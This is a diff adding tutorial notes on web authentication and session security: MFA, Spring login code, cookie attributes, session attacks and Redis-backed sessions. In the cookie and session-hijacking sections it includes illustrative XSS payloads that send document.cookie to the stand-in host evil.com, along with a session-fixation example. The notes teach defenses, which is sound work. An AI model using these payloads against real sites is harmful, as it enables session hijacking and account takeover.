+│  Biometric is LOCAL VERIFICATION, not authentication to server!        │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │                                                                 │   │
+│  │  WHAT ACTUALLY HAPPENS (WebAuthn/Passkeys):                     │   │
+│  │                                                                 │   │
+│  │  1. Server sends challenge                                      │   │
+│  │  2. Device says "Verify yourself to use the private key"        │   │
+│  │  3. User provides fingerprint/face (LOCAL check)                │   │
+│  │  4. Device unlocks private key in secure enclave                │   │
+│  │  5. Device signs challenge with private key                     │   │
+│  │  6. Signature sent to server (NOT the biometric!)               │   │
+│  │                                                                 │   │
+│  │  Your fingerprint NEVER leaves your device!                     │   │
+│  │  Server never sees biometric data!                              │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  BIOMETRIC CONSIDERATIONS:                                              │
+│                                                                         │
+│  ✅ ADVANTAGES:                                                         │
+│  • Convenient (always with you)                                         │
+│  • Hard to share or delegate                                            │
+│  • Fast authentication                                                  │
+│                                                                         │
+│  ❌ DISADVANTAGES:                                                      │
+│  • CANNOT BE CHANGED if compromised                                     │
+│  • False acceptance/rejection rates                                     │
+│  • Privacy concerns (government surveillance)                           │
+│  • Can be coerced (forced to unlock)                                    │
+│  • Spoofing possible (photos, fingerprint molds)                        │
+│                                                                         │
+│  BEST PRACTICE:                                                         │
+│  Use biometrics as LOCAL unlock, not as the authentication itself.      │
+│  Biometric + cryptographic key = secure                                 │
+│  Biometric alone = problematic                                          │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+````
+
+---
+
+## 7. AUTHENTICATION FLOW BEST PRACTICES
+
+```java
+@RestController
+@RequestMapping("/api/auth")
+public class AuthController {
+    
+    private final AuthenticationService authService;
+    private final RateLimiter rateLimiter;
+    
+    /**
+     * Complete login flow with MFA support
+     */
+    @PostMapping("/login")
+    public ResponseEntity<?> login(
+            @Valid @RequestBody LoginRequest request,
+            HttpServletRequest httpRequest) {
+        
+        String clientIp = getClientIp(httpRequest);
+        
+        // Rate limiting by IP and username
+        if (!rateLimiter.tryAcquire(clientIp, request.getUsername())) {
+            return ResponseEntity.status(429)
+                .body(new ErrorResponse("Too many login attempts. Try again later."));
+        }
+        
+        try {
+            // Step 1: Verify credentials
+            AuthResult result = authService.authenticate(
+                request.getUsername(), 
+                request.getPassword()
+            );
+            
+            if (!result.isSuccess()) {
+                // Don't reveal if username exists
+                return ResponseEntity.status(401)
+                    .body(new ErrorResponse("Invalid credentials"));
+            }
+            
+            User user = result.getUser();
+            
+            // Step 2: Check if MFA is required
+            if (user.isMfaEnabled()) {
+                // Return partial token, require MFA completion
+                String mfaToken = authService.createMfaToken(user);
+                return ResponseEntity.ok(new MfaRequiredResponse(mfaToken, user.getMfaType()));
+            }
+            
+            // Step 3: Create session/token
+            TokenResponse tokens = authService.createTokens(user);
+            
+            // Audit log
+            auditLog.log("LOGIN_SUCCESS", user.getId(), clientIp);
+            
+            return ResponseEntity.ok(tokens);
+            
+        } catch (AccountLockedException e) {
+            return ResponseEntity.status(423)
+                .body(new ErrorResponse("Account locked. Contact support."));
+        }
+    }
+    
+    /**
+     * MFA verification step
+     */
+    @PostMapping("/mfa/verify")
+    public ResponseEntity<?> verifyMfa(
+            @Valid @RequestBody MfaVerifyRequest request,
+            HttpServletRequest httpRequest) {
+        
+        String clientIp = getClientIp(httpRequest);
+        
+        try {
+            // Validate MFA token
+            MfaSession session = authService.validateMfaToken(request.getMfaToken());
+            
+            // Verify MFA code
+            boolean valid = switch (session.getMfaType()) {
+                case TOTP -> totpService.verify(session.getUserId(), request.getCode());
+                case SMS -> smsService.verify(session.getUserId(), request.getCode());
+                case HARDWARE_KEY -> webAuthnService.verify(session.getUserId(), request.getAssertion());
+                default -> throw new UnsupportedMfaTypeException();
+            };
+            
+            if (!valid) {
+                auditLog.log("MFA_FAILED", session.getUserId(), clientIp);
+                return ResponseEntity.status(401)
+                    .body(new ErrorResponse("Invalid verification code"));
+            }
+            
+            // MFA passed - create full session
+            User user = userRepository.findById(session.getUserId()).get();
+            TokenResponse tokens = authService.createTokens(user);
+            
+            auditLog.log("MFA_SUCCESS", user.getId(), clientIp);
+            
+            return ResponseEntity.ok(tokens);
+            
+        } catch (InvalidMfaTokenException e) {
+            return ResponseEntity.status(401)
+                .body(new ErrorResponse("Invalid or expired MFA session"));
+        }
+    }
+    
+    /**
+     * Logout - invalidate tokens
+     */
+    @PostMapping("/logout")
+    @PreAuthorize("isAuthenticated()")
+    public ResponseEntity<?> logout(
+            @RequestHeader("Authorization") String authHeader,
+            @AuthenticationPrincipal UserDetails user) {
+        
+        String token = authHeader.replace("Bearer ", "");
+        authService.invalidateToken(token);
+        
+        auditLog.log("LOGOUT", user.getUsername());
+        
+        return ResponseEntity.ok().build();
+    }
+}
+```
+
+---
+
+## ✅ SECURITY CHECKLIST FOR SESSION 5
+```
+□ Understand: Authentication ≠ Authorization
+□ Implement MFA (TOTP minimum, hardware keys for high-security)
+□ Follow NIST password guidelines (length > complexity)
+□ Check passwords against breach lists (HIBP)
+□ Rate limit authentication attempts
+□ Implement account lockout with progressive delays
+□ Don't reveal if username exists (prevent enumeration)
+□ Log all authentication events
+□ Use constant-time comparisons
+□ Consider passwordless options for new projects
+□ Biometrics for local unlock, not server authentication
+```
+
+---
+
+## 🚫 COMMON MISTAKES
+```
+1. "We require special characters, that's secure enough"
+   → Complexity rules don't help. Length and breach checking do.
+
+2. "SMS OTP is two-factor authentication, we're safe"
+   → SMS is weakest MFA. SIM swapping is real. Use TOTP or hardware keys.
+
+3. "Biometric authentication sends fingerprint to server"
+   → NO! Biometric is local unlock. Private key signs the challenge.
+
+4. "We force password changes every 90 days"
+   → NIST says DON'T. Only force change on suspected compromise.
+
+5. "401 means unauthorized"
+   → Confusing terminology. 401 = unauthenticated. 403 = unauthorized.
+
+6. "Password reset questions add security"
+   → Security questions are easily researched. Don't use them.
+
+7. "We hash the TOTP secret with the password hash"
+   → TOTP secret needs to be readable for code generation. Encrypt, don't hash.
+```
+
+---
+
+
+## SESSION 5 COMPLETE
+
+**Key Takeaways:**
+- Authentication (prove who you are) ≠ Authorization (what you can do)
+- Three factors: Something you Know, Have, Are
+- MFA dramatically reduces account takeover - implement it!
+- NIST 2024: Length > Complexity, no forced rotation
+- Passkeys are the future - phishing resistant, convenient
+- Biometrics are local verification, not server authentication
+
+# SESSION 6: SESSION-BASED AUTHENTICATION Stateful Authentication - Cookies, Sessions & Their Vulnerabilities
+
+## 1. WHY SESSIONS EXIST - HTTP is Stateless
+
+```
+THE PROBLEM:
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  HTTP is STATELESS - server doesn't remember previous requests          │
+│                                                                         │
+│  Request 1: POST /login (username=deniz, password=****)                 │
+│  Response:  "Login successful!"                                         │
+│                                                                         │
+│  Request 2: GET /dashboard                                              │
+│  Response:  "Who are you? Please login."  😕                            │
+│                                                                         │
+│  Server has NO MEMORY of Request 1 when processing Request 2!           │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+
+
+THE SOLUTION: Sessions
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│  Request 1: POST /login (username=deniz, password=****)                 │
+│  Server:    Creates session, stores: {userId: 123, role: "USER"}        │
+│             Generates session ID: "abc123xyz"                           │
+│  Response:  Set-Cookie: JSESSIONID=abc123xyz                            │
+│                                                                         │
+│  Request 2: GET /dashboard                                              │
+│             Cookie: JSESSIONID=abc123xyz                                │
+│  Server:    Looks up "abc123xyz" → finds {userId: 123, role: "USER"}    │
+│  Response:  "Welcome back, Deniz!"  ✅                                  │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Session Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SESSION-BASED AUTHENTICATION                       │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│   CLIENT (Browser)                         SERVER                       │
+│   ┌─────────────────┐                     ┌─────────────────────────┐  │
+│   │                 │                     │                         │  │
+│   │  Cookie:        │                     │  Session Store:         │  │
+│   │  JSESSIONID=    │────── matches ─────►│  ┌───────────────────┐  │  │
+│   │  "abc123xyz"    │                     │  │ "abc123xyz" → {   │  │  │
+│   │                 │                     │  │   userId: 123,    │  │  │
+│   │  (Just an ID,   │                     │  │   role: "USER",   │  │  │
+│   │   no data)      │                     │  │   createdAt: ..., │  │  │
+│   │                 │                     │  │   lastAccess: ... │  │  │
+│   └─────────────────┘                     │  │ }                 │  │  │
+│                                           │  └───────────────────┘  │  │
+│                                           │                         │  │
+│                                           │  Session data lives     │  │
+│                                           │  on SERVER, not client  │  │
+│                                           └─────────────────────────┘  │
+│                                                                         │
+│   KEY INSIGHT:                                                          │
+│   • Client only holds the SESSION ID (like a coat check ticket)         │
+│   • Server holds all the actual DATA (like the actual coat)             │
+│   • This is STATEFUL - server must maintain state                       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+## 2. HTTP COOKIES - Deep Dive
+
+### Cookie Basics
+
+```
+HTTP COOKIE ANATOMY:
+
+Set-Cookie: JSESSIONID=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
+            └───────┬────────────┘ └──┬─┘  └───┬──┘  └──┬─┘  └─────┬─────┘  └────┬────┘
+                    │                 │        │        │          │             │
+              Name=Value            Path    HttpOnly  Secure   SameSite      Expiry
+
+
+COOKIE FLOW:
+
+┌──────────┐                                              ┌──────────┐
+│  CLIENT  │                                              │  SERVER  │
+└────┬─────┘                                              └────┬─────┘
+     │                                                         │
+     │  1. POST /login                                         │
+     │────────────────────────────────────────────────────────►│
+     │                                                         │
+     │  2. HTTP/1.1 200 OK                                     │
+     │     Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure     │
+     │◄────────────────────────────────────────────────────────│
+     │                                                         │
+     │     Browser automatically stores cookie                 │
+     │                                                         │
+     │  3. GET /api/data                                       │
+     │     Cookie: JSESSIONID=abc123                           │
+     │────────────────────────────────────────────────────────►│
+     │                                                         │
+     │     Browser automatically sends cookie on every request │
+     │     to same domain                                      │
+```
+
+### Cookie Security Attributes
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      COOKIE SECURITY ATTRIBUTES                         │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  HttpOnly                                                       │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  WITHOUT HttpOnly:                                              │   │
+│  │  <script>                                                       │   │
+│  │    // Attacker's XSS payload                                    │   │
+│  │    fetch('https://evil.com/steal?cookie=' + document.cookie);   │   │
+│  │  </script>                                                      │   │
+│  │  → Session stolen! 😱                                           │   │
+│  │                                                                 │   │
+│  │  WITH HttpOnly:                                                 │   │
+│  │  <script>                                                       │   │
+│  │    console.log(document.cookie);  // JSESSIONID not visible!   │   │
+│  │  </script>                                                      │   │
+│  │  → JavaScript cannot access the cookie ✅                       │   │
+│  │                                                                 │   │
+│  │  RULE: ALWAYS set HttpOnly for session cookies                  │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  Secure                                                         │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  WITHOUT Secure:                                                │   │
+│  │  Cookie sent over HTTP and HTTPS                                │   │
+│  │  → Attacker on same WiFi intercepts HTTP traffic                │   │
+│  │  → Session stolen! (Firesheep attack)                           │   │
+│  │                                                                 │   │
+│  │  WITH Secure:                                                   │   │
+│  │  Cookie ONLY sent over HTTPS                                    │   │
+│  │  → Even if HTTP request happens, cookie not included            │   │
+│  │                                                                 │   │
+│  │  RULE: ALWAYS set Secure in production                          │   │
+│  │        (can skip in localhost for development)                  │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  SameSite                                                       │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  Controls when cookies are sent on cross-site requests          │   │
+│  │                                                                 │   │
+│  │  SameSite=Strict                                                │   │
+│  │  • Cookie NEVER sent on cross-site requests                     │   │
+│  │  • Even clicking link from email won't send cookie              │   │
+│  │  • Best protection against CSRF                                 │   │
+│  │  • May break some legitimate flows (links from other sites)     │   │
+│  │                                                                 │   │
+│  │  SameSite=Lax (DEFAULT in modern browsers)                      │   │
+│  │  • Cookie sent on top-level navigation (clicking links)         │   │
+│  │  • NOT sent on cross-site POST, iframe, AJAX                    │   │
+│  │  • Good balance of security and usability                       │   │
+│  │                                                                 │   │
+│  │  SameSite=None                                                  │   │
+│  │  • Cookie sent on ALL requests (including cross-site)           │   │
+│  │  • MUST be combined with Secure flag                            │   │
+│  │  • Only use if you NEED cross-site cookies (OAuth, embeds)      │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  Path                                                           │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  Restricts which paths receive the cookie                       │   │
+│  │                                                                 │   │
+│  │  Path=/admin  → Cookie only sent to /admin/*                    │   │
+│  │  Path=/       → Cookie sent to all paths (most common)          │   │
+│  │                                                                 │   │
+│  │  NOTE: Path is NOT a security boundary!                         │   │
+│  │  JavaScript on /public can still read cookies with Path=/admin  │   │
+│  │  (unless HttpOnly is set)                                       │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  Domain                                                         │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  Controls which domains receive the cookie                      │   │
+│  │                                                                 │   │
+│  │  Set-Cookie from app.example.com:                               │   │
+│  │                                                                 │   │
+│  │  Domain=example.com                                             │   │
+│  │  → Sent to: example.com, app.example.com, api.example.com       │   │
+│  │                                                                 │   │
+│  │  No Domain attribute (default)                                  │   │
+│  │  → Sent to: app.example.com ONLY (most restrictive)             │   │
+│  │                                                                 │   │
+│  │  SECURITY: Omit Domain for most restrictive scope               │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │  Max-Age / Expires                                              │   │
+│  ├─────────────────────────────────────────────────────────────────┤   │
+│  │                                                                 │   │
+│  │  Max-Age=3600      → Cookie expires in 1 hour                   │   │
+│  │  Max-Age=0         → Delete cookie immediately                  │   │
+│  │  Expires=<date>    → Cookie expires at specific date/time       │   │
+│  │  Neither set       → Session cookie (deleted when browser closes)│   │
+│  │                                                                 │   │
+│  │  SECURITY:                                                      │   │
+│  │  • Session cookies for sensitive apps (banking)                 │   │
+│  │  • Short Max-Age for persistent sessions                        │   │
+│  │  • Remember-me cookies need longer expiry (handle carefully)    │   │
+│  │                                                                 │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### The Perfect Session Cookie
+
+```
+Set-Cookie: JSESSIONID=<cryptographically-random-value>;
+            Path=/;
+            HttpOnly;
+            Secure;
+            SameSite=Lax;
+            Max-Age=1800
+
+Breaking it down:
+- JSESSIONID=<random>  : Unpredictable session ID (128+ bits of entropy)
+- Path=/               : Available to entire application
+- HttpOnly             : JavaScript cannot read (XSS protection)
+- Secure               : HTTPS only (network sniffing protection)
+- SameSite=Lax         : Basic CSRF protection with usability
+- Max-Age=1800         : 30 minutes (adjust per your needs)
+```
+
+---
+
+## 3. SESSION ATTACKS
+
+### Attack 1: Session Hijacking
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SESSION HIJACKING                                  │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Attacker steals a valid session ID and uses it to impersonate user    │
+│                                                                         │
+│  ATTACK VECTORS:                                                        │
+│                                                                         │
+│  1. NETWORK SNIFFING (HTTP without TLS)                                │
+│     ┌─────────┐      ┌─────────┐      ┌─────────┐                      │
+│     │  User   │─────►│ Attacker│─────►│ Server  │                      │
+│     └─────────┘ WiFi └─────────┘      └─────────┘                      │
+│                  ↓                                                      │
+│           Captures session cookie                                       │
+│                                                                         │
+│     PREVENTION: HTTPS everywhere + Secure cookie flag                   │
+│                                                                         │
+│  2. CROSS-SITE SCRIPTING (XSS)                                         │
+│     <script>                                                            │
+│       new Image().src = "https://evil.com/steal?c=" + document.cookie; │
+│     </script>                                                           │
+│                                                                         │
+│     PREVENTION: HttpOnly cookie flag + XSS prevention                   │
+│                                                                         │
+│  3. MALWARE / BROWSER EXTENSION                                         │
+│     Malicious software reads cookies from browser storage               │
+│                                                                         │
+│     PREVENTION: Limited (user's machine is compromised)                 │
+│     MITIGATION: Session binding, short expiration, anomaly detection    │
+│                                                                         │
+│  4. PHYSICAL ACCESS                                                     │
+│     Someone uses your unlocked computer                                 │
+│                                                                         │
+│     PREVENTION: Session timeout, re-auth for sensitive operations       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Attack 2: Session Fixation
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SESSION FIXATION                                   │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Attacker sets the session ID BEFORE victim logs in                     │
+│                                                                         │
+│  ATTACK FLOW:                                                           │
+│                                                                         │
+│  1. Attacker visits site, gets session ID: "evil123"                    │
+│                                                                         │
+│  2. Attacker sends victim a link:                                       │
+│     https://bank.com/login?JSESSIONID=evil123                          │
+│     or                                                                  │
+│     <script>document.cookie="JSESSIONID=evil123";</script>             │
+│                                                                         │
+│  3. Victim clicks link, logs in successfully                            │
+│     Server associates "evil123" with victim's account                   │
+│                                                                         │
+│  4. Attacker uses "evil123" (which they know!)                          │
+│     Server thinks attacker is the victim!                               │
+│                                                                         │
+│  ┌─────────┐         ┌─────────┐         ┌─────────┐                   │
+│  │ Attacker│         │  Victim │         │  Server │                   │
+│  └────┬────┘         └────┬────┘         └────┬────┘                   │
+│       │                   │                   │                         │
+│       │──── Get session ─────────────────────►│                         │
+│       │◄─── JSESSIONID=evil123 ──────────────│                         │
+│       │                   │                   │                         │
+│       │── Send evil123 ──►│                   │                         │
+│       │   to victim       │                   │                         │
+│       │                   │                   │                         │
+│       │                   │── Login with ────►│                         │
+│       │                   │   evil123         │                         │
+│       │                   │◄─ Login success ──│                         │
+│       │                   │                   │                         │
+│       │─── Use evil123 ──────────────────────►│                         │
+│       │◄── Welcome, Victim! (😱) ────────────│                         │
+│                                                                         │
+│  PREVENTION:                                                            │
+│  • Generate NEW session ID after successful login                       │
+│  • Never accept session IDs from URL parameters                         │
+│  • Regenerate session ID on privilege level change                      │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Attack 3: Session Prediction
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SESSION PREDICTION                                 │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  Attacker guesses valid session IDs                                     │
+│                                                                         │
+│  VULNERABLE IMPLEMENTATIONS:                                            │
+│                                                                         │
+│  ❌ Sequential IDs:                                                     │
+│     Session 1: 1001                                                     │
+│     Session 2: 1002                                                     │
+│     Session 3: 1003  ← Attacker tries 1004, 1005, 1006...              │
+│                                                                         │
+│  ❌ Timestamp-based:                                                    │
+│     Session: 1642521600000  (Unix timestamp)                            │
+│     Attacker knows approximate time → limited search space              │
+│                                                                         │
+│  ❌ Weak random:                                                        │
+│     Using java.util.Random (predictable!)                               │
+│     Attacker observes a few sessions → predicts next ones               │
+│                                                                         │
+│  ✅ SECURE:                                                             │
+│     Session: "Kj7x9Lm2Qw4Rn8Yp1Tz6Vb3Hd5Fg0Jc"                         │
+│     • 128+ bits of entropy                                              │
+│     • Cryptographically secure random (SecureRandom)                    │
+│     • No pattern, no predictability                                     │
+│                                                                         │
+│  MATH:                                                                  │
+│  128-bit random ID = 2^128 possibilities                                │
+│  = 340,282,366,920,938,463,463,374,607,431,768,211,456                 │
+│  Even at 1 billion guesses/second = 10^22 years to brute force         │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+### Attack 4: Session Timeout Issues
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                      SESSION TIMEOUT VULNERABILITIES                    │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  TOO LONG TIMEOUT:                                                      │
+│  • User logs into banking app at library                                │
+│  • Walks away, forgets to logout                                        │
+│  • Next person uses the still-active session                            │
+│                                                                         │
+│  NO ABSOLUTE TIMEOUT:                                                   │
+│  • Session stays alive forever as long as there's activity              │
+│  • Stolen session remains valid indefinitely                            │
+│                                                                         │
+│  BEST PRACTICE - TWO TIMEOUTS:                                          │
+│                                                                         │
+│  1. IDLE TIMEOUT (Inactivity):                                          │
+│     If no activity for 15-30 minutes → session expires                  │
+│     Reset timer on each request                                         │
+│                                                                         │
+│  2. ABSOLUTE TIMEOUT:                                                   │
+│     Session expires after 8-24 hours regardless of activity             │
+│     Forces re-authentication periodically                               │
+│                                                                         │
+│  SENSITIVE OPERATIONS:                                                  │
+│  • Re-authenticate for: password change, payment, personal info         │
+│  • Even with valid session, require recent authentication               │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+
+## 5. DISTRIBUTED SESSIONS WITH REDIS
+
+```
+🔰 REDIS BASICS (Quick Refresher):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Redis = In-memory data store, extremely fast
+Used for: Caching, sessions, pub/sub, rate limiting
+
+Key concepts:
+- Key-value store (like a HashMap)
+- Data lives in memory (fast but volatile)
+- Can persist to disk
+- Supports TTL (time-to-live) - perfect for sessions!
+```
+
+### Why Distributed Sessions?
+```
+THE PROBLEM: Multiple Server Instances
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│   WITHOUT DISTRIBUTED SESSIONS:                                         │
+│                                                                         │
+│   ┌──────────────┐                                                      │
+│   │ Load Balancer│                                                      │
+│   └──────┬───────┘                                                      │
+│          │                                                              │
+│   ┌──────┴──────┐                                                       │
+│   │             │                                                       │
+│   ▼             ▼                                                       │
+│ ┌─────────┐  ┌─────────┐                                               │
+│ │Server 1 │  │Server 2 │                                               │
+│ │Session: │  │Session: │                                               │
+│ │ abc123  │  │  (none) │                                               │
+│ └─────────┘  └─────────┘                                               │
+│                                                                         │
+│   Request 1 → Server 1 → Session created                               │
+│   Request 2 → Server 2 → "Who are you?!" 😕                            │
+│                                                                         │
+│   SOLUTIONS:                                                            │
+│   1. Sticky sessions (load balancer always routes to same server)       │
+│      ❌ Problem: Server dies = all sessions lost                        │
+│                                                                         │
+│   2. Distributed sessions (shared session store)                        │
+│      ✅ Any server can handle any request                               │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+
+
+WITH REDIS (Distributed Sessions):
+
+┌─────────────────────────────────────────────────────────────────────────┐
+│                                                                         │
+│   ┌──────────────┐                                                      │
+│   │ Load Balancer│                                                      │
+│   └──────┬───────┘                                                      │
+│          │                                                              │
+│   ┌──────┴──────┐                                                       │
+│   │             │                                                       │
+│   ▼             ▼                                                       │
+│ ┌─────────┐  ┌─────────┐                                               │
+│ │Server 1 │  │Server 2 │                                               │
+│ └────┬────┘  └────┬────┘                                               │
+│      │            │                                                     │
+│      └─────┬──────┘                                                     │
+│            │                                                            │
+│            ▼                                                            │
+│      ┌──────────┐                                                       │
+│      │  REDIS   │                                                       │
+│      │ Session: │                                                       │
+│      │  abc123  │                                                       │
+│      └──────────┘                                                       │
+│                                                                         │
+│   Any server can read/write session from Redis ✅                       │
+│   Server dies? No problem - session still in Redis                      │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+````
+
+### Spring Session with Redis
+
+```xml
+<!-- pom.xml -->
+<dependency>
+    <groupId>org.springframework.session</groupId>
+    <artifactId>spring-session-data-redis</artifactId>
+</dependency>
+<dependency>
+    <groupId>org.springframework.boot</groupId>
+    <artifactId>spring-boot-starter-data-redis</artifactId>
+</dependency>
+```
+
+yaml
+
+```yaml
+# application.yml
+spring:
+  session:
+    store-type: redis
+    redis:
+      namespace: myapp:sessions    # Prefix for Redis keys
+      flush-mode: on_save          # When to write to Redis
+  redis:
+    host: ${REDIS_HOST:localhost}
+    port: ${REDIS_PORT:6379}
+    password: ${REDIS_PASSWORD:}
+    ssl: true                      # Use TLS in production!
+    timeout: 2000ms
+    
+server:
+  servlet:
+    session:
+      timeout: 30m
+```
+
+
+```java
+@Configuration
+@EnableRedisHttpSession(maxInactiveIntervalInSeconds = 1800)  // 30 minutes
+public class RedisSessionConfig {
+    
+    @Bean
+    public LettuceConnectionFactory connectionFactory() {
+        RedisStandaloneConfiguration config = new RedisStandaloneConfiguration();
+        config.setHostName(redisHost);
+        config.setPort(redisPort);
+        config.setPassword(RedisPassword.of(redisPassword));
+        
+        LettuceClientConfiguration clientConfig = LettuceClientConfiguration.builder()
+            .useSsl()  // Enable TLS
+            .commandTimeout(Duration.ofMillis(2000))
+            .build();
+        
+        return new LettuceConnectionFactory(config, clientConfig);
+    }
+    
+    @Bean
+    public RedisSerializer<Object> springSessionDefaultRedisSerializer() {
+        // Use JSON serialization for debugging/portability
+        return new GenericJackson2JsonRedisSerializer();
+    }
+    
+    @Bean
+    public CookieSerializer cookieSerializer() {
+        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
+        serializer.setCookieName("SESSIONID");
+        serializer.setDomainNamePattern("^.+?\\.(\\w+\\.[a-z]+)$");
+        serializer.setCookiePath("/");
+        serializer.setUseHttpOnlyCookie(true);
+        serializer.setUseSecureCookie(true);
+        serializer.setSameSite("Lax");
+        return serializer;
+    }
+}
+```
+
+### What Redis Stores
+```
+Redis keys created by Spring Session:
+
+KEY: myapp:sessions:sessions:abc123-def456-ghi789
+TYPE: Hash
+
+FIELD                          VALUE
+─────────────────────────────────────────────────────────────────
+sessionAttr:userId             123
+sessionAttr:username           "deniz"
+sessionAttr:roles              ["USER", "ADMIN"]
+sessionAttr:loginTime          "2024-01-15T10:30:00Z"
+sessionAttr:lastActivity       "2024-01-15T11:45:00Z"
+creationTime                   1705312200000
+maxInactiveInterval            1800
+lastAccessedTime               1705316700000
+
+
+Redis CLI commands to inspect:
+
+# List all sessions
+KEYS myapp:sessions:sessions:*
+
+# View session data
+HGETALL myapp:sessions:sessions:abc123-def456-ghi789
+
+# Check TTL (time remaining)
+TTL myapp:sessions:sessions:abc123-def456-ghi789
+
+# Manually expire a session (logout from backend)
+DEL myapp:sessions:sessions:abc123-def456-ghi789
+````
+
+### Session Security with Redis
+
+```java
+@Service
+public class RedisSessionSecurityService {
+    
+    private final RedisTemplate<String, Object> redisTemplate;
+    private final SessionRepository<? extends Session> sessionRepository;
+    
+    private static final String SESSION_KEY_PREFIX = "myapp:sessions:sessions:";
+    
+    /**
+     * Invalidate all sessions for a user (password change, security concern)
+     */
+    public void invalidateAllUserSessions(Long userId) {
+        // Find all sessions for this user
+        // Note: This requires secondary index or scanning
+        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
+        
+        for (String key : keys) {
+            Map<Object, Object> sessionData = redisTemplate.opsForHash().entries(key);
+            Object sessionUserId = sessionData.get("sessionAttr:userId");
+            
+            if (userId.equals(sessionUserId)) {
+                redisTemplate.delete(key);
+                log.info("Invalidated session: {} for user: {}", key, userId);
+            }
+        }
+    }
+    
+    /**
+     * Count active sessions for a user
+     */
+    public int countUserSessions(Long userId) {
+        int count = 0;
+        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
+        
+        for (String key : keys) {
+            Object sessionUserId = redisTemplate.opsForHash()
+                .get(key, "sessionAttr:userId");
+            if (userId.equals(sessionUserId)) {
+                count++;
+            }
+        }
+        
+        return count;
+    }
+    
+    /**
+     * Limit concurrent sessions per user
+     */
+    public void enforceSessionLimit(Long userId, int maxSessions) {
+        // Get all user sessions with creation time
+        List<SessionInfo> userSessions = new ArrayList<>();
+        Set<String> keys = redisTemplate.keys(SESSION_KEY_PREFIX + "*");
+        
+        for (String key : keys) {
+            Map<Object, Object> data = redisTemplate.opsForHash().entries(key);
+            Object sessionUserId = data.get("sessionAttr:userId");
+            
+            if (userId.equals(sessionUserId)) {
+                Long creationTime = (Long) data.get("creationTime");
+                userSessions.add(new SessionInfo(key, creationTime));
+            }
+        }
+        
+        // If over limit, invalidate oldest sessions
+        if (userSessions.size() > maxSessions) {
+            userSessions.sort(Comparator.comparing(SessionInfo::creationTime));
+            
+            int toRemove = userSessions.size() - maxSessions;
+            for (int i = 0; i < toRemove; i++) {
+                redisTemplate.delete(userSessions.get(i).key());
+                log.info("Removed excess session for user {}: {}", 
+                         userId, userSessions.get(i).key());
+            }
+        }
+    }
+    
+    record SessionInfo(String key, Long creationTime) {}
+}
+```
+
+---
+
+## 6. SESSIONS VS TOKENS - When to Use Which
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    SESSIONS VS TOKENS (JWT)                             │
+├───────────────────┬─────────────────────────┬───────────────────────────┤
+│                   │       SESSIONS          │         TOKENS (JWT)      │
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ State             │ Stateful (server stores)│ Stateless (self-contained)│
+├───────────────────┼─────────────────────────┼───────────────────────────┤
+│ Storage           │ Server (memory/Redis)   │ Client (cookie/storage)   │
